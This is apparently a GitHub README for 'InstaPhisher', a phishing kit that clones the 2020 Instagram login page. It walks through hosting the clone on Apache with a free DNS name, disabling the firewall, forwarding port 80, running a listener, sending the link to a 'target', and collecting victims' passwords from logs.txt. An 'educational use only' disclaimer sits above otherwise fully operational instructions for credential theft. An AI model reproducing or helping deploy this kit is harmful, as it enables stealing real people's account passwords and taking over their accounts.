# InstaPhisher - 2020

__author__ ExilasP <br/>
__version__ 1.0.0


# Disclamer

I am in no way responsible for illegal uses. For educational use only.


# Information

This site is a clone of the 2020 instagram login page. You need to have and configure a DNS (you can get a free one here: https://www.freenom.com/fr). You must also have a valid apache version (https://httpd.apache.org/download.cgi). Then, move all InstaPhisher files to the apache folder, '/var/www/html' for linux. Make sure to disable your firewall and redirect the ports 80 on your router to your machine. Then, grant read and write permissions to the files listner.py and login.php. After, use python in a terminal and start the file listner.py. Send your link to your target and wait. Please do not modify the logs.txt file during this step. When your victim logs on, you'll be notified via terminal. The passwords will be saved in the logs.txt file.


You can modify the redirect link in the login.php file. Enter url in header() function, after 'Location: ' at line 19. The default redirection is https://www.instagram.com.


Exemple:

-   header("Location: https://www.instagram.com");
-   header("Location: <redirection_url>");

# Install

### Linux

```
git-clone https://github.com/ExilasP/InstaPhisher.git
cd InstaPhisher
cp * -r '/var/www/html'
cd /var/www/html
sudo chmod +777 login.php && sudo chmod +777 InstaPhisher.py
python InstaPhisher.py
```


# NOTICE

### Requirements

-   Python : https://www.python.org/downloads/
-   Apache : https://httpd.apache.org/download.cgi
-   Php    : https://www.php.net/downloads
-   Mysql  : https://www.mysql.com/
-   DNS    : https://www.freenom.com/

### Usage

Linux:
```
python InstaPhisher.py
```

Windows:
```
listner.py
```

When your target has entered his password, you will receive a message and a sound notification :
```
[+] New password hacked - <UserTarget>
```
